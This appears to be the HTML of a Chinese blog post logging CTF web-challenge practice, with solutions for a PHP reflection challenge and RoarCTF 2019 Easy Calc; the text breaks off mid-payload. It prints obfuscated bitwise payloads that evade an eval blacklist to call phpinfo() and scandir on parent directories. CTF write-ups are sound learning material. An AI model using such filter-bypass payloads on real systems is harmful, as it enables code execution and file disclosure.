@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="0xCreed" type="application/atom+xml">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="google-site-verification" content="rVyfNQnulCtgdXjqVYGrMUrs740-YJfu_KMgtp6etq0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css?v=1.0.2">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="WEB1.某师傅出的招新题12345678910111213141516171819202122232425&amp;lt;?php/** Flag in flag.phpYou can use &quot;readfile&quot; function.**/class TestClass &amp;#123; &amp;#125;show_source(__FILE__);$str1 = $_GET[&apos;str1&apos;];$str2 = $_">
+<meta name="keywords" content="刷题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="6月刷题记录">
+<meta property="og:url" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/index.html">
+<meta property="og:site_name" content="0xCreed">
+<meta property="og:description" content="WEB1.某师傅出的招新题12345678910111213141516171819202122232425&amp;lt;?php/** Flag in flag.phpYou can use &quot;readfile&quot; function.**/class TestClass &amp;#123; &amp;#125;show_source(__FILE__);$str1 = $_GET[&apos;str1&apos;];$str2 = $_">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/image-20200602005512196.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/image-20200608004804065.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/image-20200608004839982.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/image-20200608005009468.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/image-20200608005047907.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/image-20200622145001059.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/image-20200622144648942.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/image-20200628174548750.png">
+<meta property="og:updated_time" content="2020-12-02T05:50:10.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="6月刷题记录">
+<meta name="twitter:description" content="WEB1.某师傅出的招新题12345678910111213141516171819202122232425&amp;lt;?php/** Flag in flag.phpYou can use &quot;readfile&quot; function.**/class TestClass &amp;#123; &amp;#125;show_source(__FILE__);$str1 = $_GET[&apos;str1&apos;];$str2 = $_">
+<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/image-20200602005512196.png">
+  <link rel="canonical" href="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>6月刷题记录 | 0xCreed</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<a href="https://github.com/0xcreed" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0xCreed</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">35</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">4</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">31</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-commonweal">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2020/06/6月刷题记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0xCreed">
+      <meta itemprop="description" content="Winter is coming">
+      <meta itemprop="image" content="/images/1.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xCreed">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">6月刷题记录
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-06-01 23:35:00" itemprop="dateCreated datePublished" datetime="2020-06-01T23:35:00+08:00">2020-06-01</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-12-02 13:50:10" itemprop="dateModified" datetime="2020-12-02T13:50:10+08:00">2020-12-02</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+        
+      
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/06/6月刷题记录/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/06/6月刷题记录/" itemprop="commentCount"></span></a>
+  </span>
+  
+  
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>16k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>15 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-某师傅出的招新题"><a href="#1-某师傅出的招新题" class="headerlink" title="1.某师傅出的招新题"></a>1.某师傅出的招新题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">Flag in flag.php</span></span><br><span class="line"><span class="comment">You can use "readfile" function.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line">$rce = <span class="keyword">new</span> $str2(<span class="string">'TestClass'</span>);</span><br><span class="line">$a = $rce-&gt;$str1();</span><br><span class="line">$st1 = $_POST[<span class="string">'st1'</span>];</span><br><span class="line">$st2 = $_POST[<span class="string">'st2'</span>];</span><br><span class="line"><span class="keyword">if</span>($st1==<span class="keyword">null</span>&amp;&amp;$st2==<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"GET!!!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $z = substr($a,$st1,<span class="number">8</span>);</span><br><span class="line">    $x = substr($a,$st2,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">echo</span> $z.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $x.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    $z($x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+
+<p>开始看题的时候很懵，没见过。后面看队友说用反射类做。就在网上找了下这方面的<a href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/" target="_blank" rel="noopener">CTF题</a>发现这道题 </p>
+<p><code>$a=$rce-&gt;$str1()</code>并不能传参，而且还有些疑惑，干嘛定义个空类 <code>Testcalss</code> 毫无头绪</p>
+<p>然后去看了下<a href="https://www.php.net/manual/zh/class.reflectionclass.php" target="_blank" rel="noopener">php手册</a>找无参的函数，突然 发现<a href="https://www.php.net/manual/zh/reflectionclass.getdoccomment.php" target="_blank" rel="noopener">ReflectionClass::getDocComment()</a> — 获取文档注释</p>
+<p>这个函数有搞头 ，利用注释中的 <code>flag.php</code> ，<code>readfile</code> 和<code>$z($x)</code>不就可以读取文件了吗</p>
+<p><img src="/2020/06/6月刷题记录/image-20200602005512196.png" alt="image-20200602005512196"></p>
+<p>这个题目出的很巧妙。orz</p>
+<h3 id="2-RoarCTF-2019-Easy-Calc"><a href="#2-RoarCTF-2019-Easy-Calc" class="headerlink" title="2.[RoarCTF 2019]Easy Calc"></a>2.[RoarCTF 2019]Easy Calc</h3><p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> <code>$blacklist</code>中过滤了 <code>^</code> 同时题目设置了WAF，过滤了<code>字母、#、！</code>，所以取反也不能用。</p>
+<p>不过可以使用按位与<code>&amp;</code>以及按位或<code>|</code>。在 PHP 中，将两个数字使用<code>.</code>拼接，会当做字符串来处理，返回的也是一个字符串。例如：<code>(1).(2)</code>出来的就是字符串<code>&quot;12&quot;</code>，然后可以用<code>{}</code>来代替<code>[]</code>来取单个字符。<br> 并且，PHP 中，<code>1/0</code>得出的是<code>float</code>类型的<code>INF</code>，<code>0/0</code>得出的是<code>float</code>类型的<code>NAN</code>，我们也可以把这些转成字符串类型，从而得到字母<code>A</code> <code>I</code> <code>N</code> <code>F</code>。</p>
+<p>E99p1ant师傅的<a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">Fuzz 脚本</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后根据这个表，就可以构造代码了。可以构造形如<code>(phpinfo)()</code>这样的形式，来动态执行函数。<br> 值得一提的是，PHP 中函数名是不区分大小写的，因此不一定需要全小写的字符拼凑函数名。<br> <code>phpinfo()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))()</span><br></pre></td></tr></table></figure>
+
+<p><code>(scandir)(../../../)</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))(((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))).((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">-2</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))|((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))))((((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((((<span class="number">8</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))|((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))))).(((((<span class="number">4</span>).(<span class="number">0</span>))&#123;<span 